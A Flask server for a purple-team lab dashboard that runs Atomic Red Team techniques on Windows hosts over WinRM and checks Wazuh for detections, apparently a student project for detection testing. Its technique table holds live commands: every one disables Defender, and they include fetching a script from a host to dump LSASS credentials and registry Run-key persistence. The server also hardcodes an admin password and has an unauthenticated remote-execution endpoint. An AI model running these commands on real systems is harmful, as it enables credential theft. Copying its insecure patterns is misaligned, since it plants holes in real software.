#!/usr/bin/env python3
"""
server.py — Purple Team Dashboard Proxy Server
Holberton Cybersecurity — Adversary Emulation Lab
"""

import json, ssl, base64, urllib.request, threading, atexit, os, signal, sys, uuid, secrets
from datetime import datetime, timezone
from flask import Flask, jsonify, request, send_from_directory
import winrm

app = Flask(__name__, static_folder='.')

# ── Config ────────────────────────────────────────────────────────────────────

INDEXER_URL   = "https://127.0.0.1:9200"
INDEXER_USER  = "admin"
INDEXER_PASS  = "ly3ar+g1BB.+L2wygfa6xgQLvIHcoaHN"
INDEX_PATTERN = "wazuh-alerts-4.x-*"

DASHBOARD_DIR = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT     = os.path.join(DASHBOARD_DIR, '..')
LOGS_DIR      = os.path.join(REPO_ROOT, 'logs')
CONFIG_DIR    = os.path.join(REPO_ROOT, 'config')
LIVE_LOG_FILE = os.path.join(LOGS_DIR, 'live-alerts.json')
MACHINES_FILE = os.path.join(CONFIG_DIR, 'machines.json')

# Only these rule IDs are treated as "our attacks" — get special highlighting
OUR_RULES = {"100002", "100003", "100004", "100005", "100006"}

# ── Techniques ────────────────────────────────────────────────────────────────

TECHNIQUES = {
    "T1059.001": {
        "name":            "PowerShell Encoded Command",
        "tactic":          "Execution",
        "rule_ids":        ["100002"],
        "confidence":      5,
        "noise":           1,
        "description":     "Executes base64-encoded PowerShell via cmd.exe -e flag to obfuscate payload",
        "command_preview": 'cmd.exe /c powershell.exe -e <base64_blob>',
        "command": (
            "Set-MpPreference -DisableRealtimeMonitoring $true; "
            "Import-Module invoke-atomicredteam -Force; "
            "Import-Module powershell-yaml -Force; "
            "Invoke-AtomicTest T1059.001 -TestNumbers 17 -TimeoutSeconds 30"
        )
    },
    "T1547.001": {
        "name":            "Registry Run Key Persistence",
        "tactic":          "Persistence",
        "rule_ids":        ["100003"],
        "confidence":      5,
        "noise":           2,
        "description":     "Writes executable to HKCU\\CurrentVersion\\Run for logon persistence",
        "command_preview": 'reg.exe ADD HKCU\\...\\Run /v AtomicRedTeam /t REG_SZ /d C:\\Path\\evil.exe',
        "command": (
            "Set-MpPreference -DisableRealtimeMonitoring $true; "
            "Import-Module invoke-atomicredteam -Force; "
            "Import-Module powershell-yaml -Force; "
            "Invoke-AtomicTest T1547.001 -TestNumbers 1 -TimeoutSeconds 30; "
            "Start-Sleep 2; "
            "Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup"
        )
    },
    "T1087.001": {
        "name":            "Local Account Discovery",
        "tactic":          "Discovery",
        "rule_ids":        ["100004"],
        "confidence":      5,
        "noise":           3,
        "description":     "Enumerates local users and groups via net.exe user/localgroup subcommands",
        "command_preview": 'net user & net localgroup "Users" & net localgroup',
        "command": (
            "Set-MpPreference -DisableRealtimeMonitoring $true; "
            "Import-Module invoke-atomicredteam -Force; "
            "Import-Module powershell-yaml -Force; "
            "Invoke-AtomicTest T1087.001 -TestNumbers 8 -TimeoutSeconds 30"
        )
    },
    "T1003.001": {
        "name":            "LSASS Memory Credential Dump",
        "tactic":          "Credential Access",
        "rule_ids":        ["100005", "100006"],
        "confidence":      5,
        "noise":           2,
        "description":     "Dumps lsass.exe memory to disk via Out-Minidump.ps1 to extract credentials",
        "command_preview": 'Get-Process lsass | Out-Minidump -DumpFilePath $env:TEMP',
        "command": (
            "Set-MpPreference -DisableRealtimeMonitoring $true; "
            "Add-MpPreference -ExclusionPath $env:TEMP; "
            "Remove-Item \"$env:TEMP\\lsass_*.dmp\" -Force -ErrorAction Ignore; "
            "Remove-Item \"$env:TEMP\\Out-Minidump.ps1\" -Force -ErrorAction Ignore; "
            "IWR 'http://192.168.56.1:8080/Out-Minidump.ps1' "
            "-OutFile \"$env:TEMP\\Out-Minidump.ps1\" -UseBasicParsing; "
            ". \"$env:TEMP\\Out-Minidump.ps1\"; "
            "Get-Process lsass | Out-Minidump -DumpFilePath $env:TEMP"
        )
    }
}

RULE_TO_TECHNIQUE = {}
for _tid, _t in TECHNIQUES.items():
    for _rid in _t["rule_ids"]:
        RULE_TO_TECHNIQUE[_rid] = _tid

# ── Machine store ─────────────────────────────────────────────────────────────
# machines.json: [{id, name, ip, username, active}]  — NO passwords on disk
# Passwords held in memory only, keyed by machine id

_machines_lock = threading.Lock()
_passwords     = {}   # machine_id -> password (memory only)
_active_id     = None # currently active machine id


def load_machines() -> list:
    try:
        with open(MACHINES_FILE) as f:
            return json.load(f)
    except Exception:
        return []


def save_machines(machines: list):
    os.makedirs(CONFIG_DIR, exist_ok=True)
    with open(MACHINES_FILE, 'w') as f:
        json.dump(machines, f, indent=2)


def get_active_machine() -> dict | None:
    with _machines_lock:
        machines = load_machines()
        for m in machines:
            if m.get('active'):
                return m
        return None


def winrm_url(ip: str) -> str:
    return f"http://{ip}:5985/wsman"


def test_winrm(ip: str, username: str, password: str) -> dict:
    """Test WinRM connectivity. Returns {ok, message}."""
    if not password:
        return {"ok": False, "message": "No password set for this machine"}
    try:
        s = winrm.Session(
            winrm_url(ip),
            auth=(username, password),
            transport='ntlm',
            read_timeout_sec=15,
            operation_timeout_sec=12
        )
        r = s.run_cmd('echo ok')
        if r.status_code == 0 and b'ok' in r.std_out:
            return {"ok": True, "message": "WinRM connection successful"}
        return {"ok": False, "message": f"Unexpected response (exit {r.status_code})"}
    except Exception as e:
        return {"ok": False, "message": str(e)}


# ── Live log ──────────────────────────────────────────────────────────────────

def init_live_log():
    os.makedirs(LOGS_DIR, exist_ok=True)
    with open(LIVE_LOG_FILE, 'w') as f:
        json.dump([], f)


def cleanup_live_log():
    try:
        if os.path.exists(LIVE_LOG_FILE):
            os.remove(LIVE_LOG_FILE)
            print("\n  Live log cleared on exit.")
    except Exception:
        pass


_live_log_lock  = threading.Lock()
_seen_alert_ids = set()


def try_append_live_log(alert_id: str, entry: dict) -> bool:
    with _live_log_lock:
        if alert_id in _seen_alert_ids:
            return False
        _seen_alert_ids.add(alert_id)
        try:
            with open(LIVE_LOG_FILE) as f:
                entries = json.load(f)
            entries.insert(0, entry)
            entries = entries[:1000]
            with open(LIVE_LOG_FILE, 'w') as f:
                json.dump(entries, f, indent=2)
            return True
        except Exception as e:
            app.logger.warning(f"Live log write failed: {e}")
            return False


# ── Indexer ───────────────────────────────────────────────────────────────────

def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx


def _auth():
    return "Basic " + base64.b64encode(
        f"{INDEXER_USER}:{INDEXER_PASS}".encode()).decode()


def indexer_search(body: dict) -> list:
    url  = f"{INDEXER_URL}/{INDEX_PATTERN}/_search"
    data = json.dumps(body).encode()
    req  = urllib.request.Request(
        url, data=data,
        headers={"Authorization": _auth(), "Content-Type": "application/json"}
    )
    try:
        resp = urllib.request.urlopen(req, context=_ssl_ctx(), timeout=10)
        return json.loads(resp.read()).get("hits", {}).get("hits", [])
    except Exception as e:
        app.logger.warning(f"Indexer error: {e}")
        return []


def query_our_rule(rule_id: str, window_minutes: int) -> list:
    assert rule_id in OUR_RULES
    return indexer_search({
        "size": 20,
        "query": {"bool": {"must": [
            {"match": {"rule.id": rule_id}},
            {"range": {"timestamp": {"gte": f"now-{window_minutes}m"}}}
        ]}},
        "sort": [{"timestamp": {"order": "desc"}}],
        "_source": [
            "timestamp", "rule.id", "rule.description", "rule.level",
            "rule.mitre", "agent.name", "agent.ip",
            "data.win.system.eventID",
            "data.win.eventdata.commandLine", "data.win.eventdata.image",
            "data.win.eventdata.parentImage", "data.win.eventdata.targetObject",
            "data.win.eventdata.targetFilename", "data.win.eventdata.sourceImage",
            "data.win.eventdata.targetImage", "data.win.eventdata.grantedAccess",
            "data.win.eventdata.user"
        ]
    })


def query_all_alerts(window_minutes: int, size: int = 200) -> list:
    """Fetch ALL alerts from Wazuh indexer regardless of rule."""
    return indexer_search({
        "size": size,
        "query": {"range": {"timestamp": {"gte": f"now-{window_minutes}m"}}},
        "sort": [{"timestamp": {"order": "desc"}}],
        "_source": [
            "timestamp", "rule.id", "rule.description", "rule.level",
            "rule.groups", "rule.mitre", "agent.name", "agent.ip",
            "data.win.system.eventID",
            "data.win.eventdata.commandLine", "data.win.eventdata.targetObject",
            "data.win.eventdata.targetFilename", "data.win.eventdata.sourceImage",
            "data.win.eventdata.targetImage", "data.win.eventdata.grantedAccess",
            "data.win.eventdata.user"
        ]
    })


def extract_key_field(src: dict) -> tuple:
    ed  = src.get("data", {}).get("win", {}).get("eventdata", {})
    eid = src.get("data", {}).get("win", {}).get("system", {}).get("eventID", "")
    if eid == "1":
        val = ed.get("commandLine", "")
        return ("commandLine", val[:120] + "..." if len(val) > 120 else val)
    elif eid == "13":
        val = ed.get("targetObject", "")
        return ("targetObject", val[-80:] if len(val) > 80 else val)
    elif eid == "10":
        si = ed.get("sourceImage", "").split("\\")[-1]
        ti = ed.get("targetImage", "").split("\\")[-1]
        return ("processAccess", f"{si} → {ti} [{ed.get('grantedAccess','')}]")
    elif eid == "11":
        val = ed.get("targetFilename", "")
        return ("targetFilename", val.split("\\")[-1] if val else "")
    else:
        val = ed.get("commandLine", ed.get("targetObject", ""))
        return ("field", val[:100] if val else "")


def danger_level(level: int) -> str:
    if level >= 15: return "CRITICAL"
    if level >= 12: return "HIGH"
    if level >= 8:  return "MEDIUM"
    if level >= 4:  return "LOW"
    return "INFO"


# ── Attack execution ──────────────────────────────────────────────────────────

attack_outputs = {}


def run_on_active(cmd: str) -> dict:
    machine = get_active_machine()
    if not machine:
        return {"success": False, "stdout": "", "stderr": "No active machine set", "exit_code": -1}
    mid = machine["id"]
    password = _passwords.get(mid)
    if not password:
        return {"success": False, "stdout": "", "stderr": "No password set for active machine. Go to Machines page and set password.", "exit_code": -1}
    try:
        s = winrm.Session(
            winrm_url(machine["ip"]),
            auth=(machine["username"], password),
            transport='ntlm',
            read_timeout_sec=120,
            operation_timeout_sec=110
        )
        r = s.run_ps(cmd)
        return {
            "success":   r.status_code == 0,
            "stdout":    r.std_out.decode('utf-8', errors='replace').strip(),
            "stderr":    r.std_err.decode('utf-8', errors='replace').strip(),
            "exit_code": r.status_code
        }
    except Exception as e:
        return {"success": False, "stdout": "", "stderr": str(e), "exit_code": -1}


# ── API ───────────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')


@app.route('/api/status')
def api_status():
    indexer_ok = winrm_ok = False
    active_name = None
    try:
        req = urllib.request.Request(INDEXER_URL, headers={"Authorization": _auth()})
        urllib.request.urlopen(req, context=_ssl_ctx(), timeout=5)
        indexer_ok = True
    except Exception:
        pass

    machine = get_active_machine()
    if machine:
        active_name = machine.get("name", machine.get("ip"))
        mid = machine["id"]
        pw  = _passwords.get(mid)
        if pw:
            r = test_winrm(machine["ip"], machine["username"], pw)
            winrm_ok = r["ok"]

    return jsonify({
        "indexer":      indexer_ok,
        "winrm":        winrm_ok,
        "active_machine": active_name,
        "time":         datetime.now(timezone.utc).isoformat()
    })


# ── Machine endpoints ─────────────────────────────────────────────────────────

@app.route('/api/machines', methods=['GET'])
def api_get_machines():
    with _machines_lock:
        machines = load_machines()
    # Return machines without passwords — add has_password flag
    result = []
    for m in machines:
        result.append({
            "id":           m["id"],
            "name":         m["name"],
            "ip":           m["ip"],
            "username":     m["username"],
            "active":       m.get("active", False),
            "has_password": m["id"] in _passwords
        })
    return jsonify(result)


@app.route('/api/machines', methods=['POST'])
def api_add_machine():
    """Add a new machine. Password required — held in memory only."""
    data = request.get_json(silent=True) or {}
    name     = (data.get("name", "")     or "").strip()
    ip       = (data.get("ip", "")       or "").strip()
    username = (data.get("username", "") or "").strip()
    password = (data.get("password", "") or "").strip()

    if not all([name, ip, username, password]):
        return jsonify({"error": "name, ip, username, and password are required"}), 400

    # Security: validate IP format roughly
    parts = ip.split(".")
    if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
        return jsonify({"error": "Invalid IP address format"}), 400

    # Test connection before saving
    test = test_winrm(ip, username, password)
    if not test["ok"]:
        return jsonify({"error": f"Connection test failed: {test['message']}",
                        "test_failed": True}), 400

    mid = str(uuid.uuid4())
    machine = {"id": mid, "name": name, "ip": ip, "username": username, "active": False}

    with _machines_lock:
        machines = load_machines()
        # First machine becomes active automatically
        if not machines:
            machine["active"] = True
        machines.append(machine)
        save_machines(machines)
        _passwords[mid] = password

    return jsonify({"success": True, "machine": {**machine, "has_password": True}})


@app.route('/api/machines/<machine_id>', methods=['DELETE'])
def api_delete_machine(machine_id):
    with _machines_lock:
        machines = load_machines()
        machines = [m for m in machines if m["id"] != machine_id]
        # If deleted machine was active, activate first remaining
        if machines and not any(m.get("active") for m in machines):
            machines[0]["active"] = True
        save_machines(machines)
        _passwords.pop(machine_id, None)
    return jsonify({"success": True})


@app.route('/api/machines/<machine_id>/activate', methods=['POST'])
def api_activate_machine(machine_id):
    with _machines_lock:
        machines = load_machines()
        found = False
        for m in machines:
            m["active"] = (m["id"] == machine_id)
            if m["id"] == machine_id:
                found = True
        if not found:
            return jsonify({"error": "Machine not found"}), 404
        save_machines(machines)
    return jsonify({"success": True})


@app.route('/api/machines/<machine_id>/set-password', methods=['POST'])
def api_set_password(machine_id):
    """Set or update password for a machine — never stored on disk."""
    data     = request.get_json(silent=True) or {}
    password = (data.get("password", "") or "").strip()
    if not password:
        return jsonify({"error": "Password is required"}), 400

    with _machines_lock:
        machines = load_machines()
        machine  = next((m for m in machines if m["id"] == machine_id), None)
    if not machine:
        return jsonify({"error": "Machine not found"}), 404

    # Test with new password
    test = test_winrm(machine["ip"], machine["username"], password)
    if not test["ok"]:
        return jsonify({"error": f"Connection test failed: {test['message']}",
                        "test_failed": True}), 400

    _passwords[machine_id] = password
    return jsonify({"success": True, "message": "Password set and connection verified"})


@app.route('/api/machines/<machine_id>/test', methods=['POST'])
def api_test_machine(machine_id):
    data     = request.get_json(silent=True) or {}
    password = data.get("password") or _passwords.get(machine_id)
    if not password:
        return jsonify({"ok": False, "message": "No password provided or stored in session"})

    with _machines_lock:
        machines = load_machines()
        machine  = next((m for m in machines if m["id"] == machine_id), None)
    if not machine:
        return jsonify({"ok": False, "message": "Machine not found"})

    result = test_winrm(machine["ip"], machine["username"], password)
    return jsonify(result)


# ── Techniques ────────────────────────────────────────────────────────────────

@app.route('/api/techniques')
def api_techniques():
    return jsonify({
        tid: {k: v for k, v in t.items() if k != "command"}
        for tid, t in TECHNIQUES.items()
    })


# ── Our-attacks alert polling ─────────────────────────────────────────────────

@app.route('/api/alerts')
def api_alerts():
    window     = int(request.args.get('window', 10))
    out        = {}
    new_alerts = []

    for tid, tech in TECHNIQUES.items():
        all_hits = []
        for rid in tech["rule_ids"]:
            all_hits.extend(query_our_rule(rid, window))
        all_hits.sort(key=lambda h: h.get("_source", {}).get("timestamp", ""), reverse=True)

        detected  = len(all_hits) > 0
        latest_ts = rule_fired = None
        key_field = ("", "")
        wazuh_lvl = 0

        if all_hits:
            src       = all_hits[0].get("_source", {})
            latest_ts = src.get("timestamp")
            rule_fired= src.get("rule", {}).get("id")
            wazuh_lvl = int(src.get("rule", {}).get("level", 0) or 0)
            key_field = extract_key_field(src)

            for hit in all_hits:
                alert_id = hit.get("_id", "")
                hit_src  = hit.get("_source", {})
                hit_rule = hit_src.get("rule", {})
                hit_ed   = hit_src.get("data", {}).get("win", {}).get("eventdata", {})
                hit_sys  = hit_src.get("data", {}).get("win", {}).get("system", {})
                hit_lvl  = int(hit_rule.get("level", 0) or 0)
                hit_kf   = extract_key_field(hit_src)

                entry = {
                    "alert_id":        alert_id,
                    "logged_at":       datetime.now(timezone.utc).isoformat(),
                    "technique_id":    tid,
                    "technique_name":  tech["name"],
                    "tactic":          tech["tactic"],
                    "timestamp":       hit_src.get("timestamp", ""),
                    "rule_id":         hit_rule.get("id", ""),
                    "rule_level":      hit_lvl,
                    "rule_desc":       hit_rule.get("description", ""),
                    "danger":          danger_level(hit_lvl),
                    "agent":           hit_src.get("agent", {}).get("name", ""),
                    "event_id":        hit_sys.get("eventID", ""),
                    "key_field_name":  hit_kf[0],
                    "key_field_value": hit_kf[1],
                    "user":            hit_ed.get("user", ""),
                    "mitre":           hit_rule.get("mitre", {}),
                    "our_attack":      True
                }
                if try_append_live_log(alert_id, entry):
                    new_alerts.append({
                        "technique_id":    tid,
                        "technique_name":  tech["name"],
                        "rule_id":         hit_rule.get("id", ""),
                        "rule_level":      hit_lvl,
                        "danger":          danger_level(hit_lvl),
                        "timestamp":       hit_src.get("timestamp", ""),
                        "key_field_name":  hit_kf[0],
                        "key_field_value": hit_kf[1]
                    })

        out[tid] = {
            "technique_id":    tid,
            "technique_name":  tech["name"],
            "tactic":          tech["tactic"],
            "detected":        detected,
            "alert_count":     len(all_hits),
            "rule_fired":      rule_fired,
            "latest_alert":    latest_ts,
            "wazuh_level":     wazuh_lvl,
            "danger":          danger_level(wazuh_lvl) if detected else "",
            "confidence":      tech["confidence"],
            "noise":           tech["noise"],
            "window_minutes":  window,
            "key_field_name":  key_field[0],
            "key_field_value": key_field[1]
        }

    return jsonify({"detections": out, "new_alerts": new_alerts})


# ── All Wazuh alerts (for logs page) ─────────────────────────────────────────

@app.route('/api/all-alerts')
def api_all_alerts():
    """Return all Wazuh alerts. Our rules flagged with our_attack=True."""
    window = int(request.args.get('window', 60))
    hits   = query_all_alerts(window)
    result = []
    for hit in hits:
        src      = hit.get("_source", {})
        rule     = src.get("rule", {})
        rule_id  = str(rule.get("id", ""))
        ed       = src.get("data", {}).get("win", {}).get("eventdata", {})
        sys_d    = src.get("data", {}).get("win", {}).get("system", {})
        lvl      = int(rule.get("level", 0) or 0)
        kf       = extract_key_field(src)
        our      = rule_id in OUR_RULES

        result.append({
            "alert_id":        hit.get("_id", ""),
            "timestamp":       src.get("timestamp", ""),
            "rule_id":         rule_id,
            "rule_desc":       rule.get("description", ""),
            "rule_level":      lvl,
            "rule_groups":     rule.get("groups", []),
            "danger":          danger_level(lvl),
            "agent":           src.get("agent", {}).get("name", ""),
            "agent_ip":        src.get("agent", {}).get("ip", ""),
            "event_id":        sys_d.get("eventID", ""),
            "key_field_name":  kf[0],
            "key_field_value": kf[1],
            "user":            ed.get("user", ""),
            "our_attack":      our,
            "technique_id":    RULE_TO_TECHNIQUE.get(rule_id, ""),
            "technique_name":  TECHNIQUES.get(RULE_TO_TECHNIQUE.get(rule_id, ""), {}).get("name", ""),
            "mitre":           rule.get("mitre", {})
        })
    return jsonify(result)


# ── Live log endpoint ─────────────────────────────────────────────────────────

@app.route('/api/live-logs')
def api_live_logs():
    try:
        with open(LIVE_LOG_FILE) as f:
            return jsonify(json.load(f))
    except Exception:
        return jsonify([])


# ── Attack execution ──────────────────────────────────────────────────────────

@app.route('/api/run/<technique_id>', methods=['POST'])
def api_run(technique_id):
    if technique_id not in TECHNIQUES:
        return jsonify({"error": f"Unknown technique: {technique_id}"}), 404
    tech = TECHNIQUES[technique_id]
    attack_outputs[technique_id] = {
        "status": "running", "stdout": "", "stderr": "",
        "start_time": datetime.now(timezone.utc).isoformat()
    }
    def execute():
        result = run_on_active(tech["command"])
        attack_outputs[technique_id].update({
            "status":    "done" if result["success"] else "error",
            "stdout":    result["stdout"],
            "stderr":    result["stderr"],
            "exit_code": result["exit_code"],
            "end_time":  datetime.now(timezone.utc).isoformat()
        })
    threading.Thread(target=execute, daemon=True).start()
    return jsonify({"status": "triggered", "technique_id": technique_id, "poll_after": 15})


@app.route('/api/attack-output/<technique_id>')
def api_attack_output(technique_id):
    return jsonify(attack_outputs.get(technique_id, {"status": "idle"}))


# ── Boot / shutdown ───────────────────────────────────────────────────────────

def handle_shutdown(sig, frame):
    cleanup_live_log()
    sys.exit(0)


if __name__ == '__main__':
    os.makedirs(CONFIG_DIR, exist_ok=True)
    init_live_log()
    atexit.register(cleanup_live_log)
    signal.signal(signal.SIGINT,  handle_shutdown)
    signal.signal(signal.SIGTERM, handle_shutdown)

    machines = load_machines()
    active   = next((m for m in machines if m.get("active")), None)

    print()
    print("  Purple Team Dashboard — Holberton Cybersecurity")
    print("  ─────────────────────────────────────────────────────")
    print("  Dashboard    : http://localhost:5000")
    print(f"  Indexer      : {INDEXER_URL}")
    print(f"  Our rules    : {', '.join(sorted(OUR_RULES))}")
    print(f"  Active machine: {active['name'] + ' (' + active['ip'] + ')' if active else 'None — add one in Machines page'}")
    if active:
        print("  NOTE: Set password for active machine from the Machines page")
    print()
    app.run(host='0.0.0.0', port=5000, debug=False)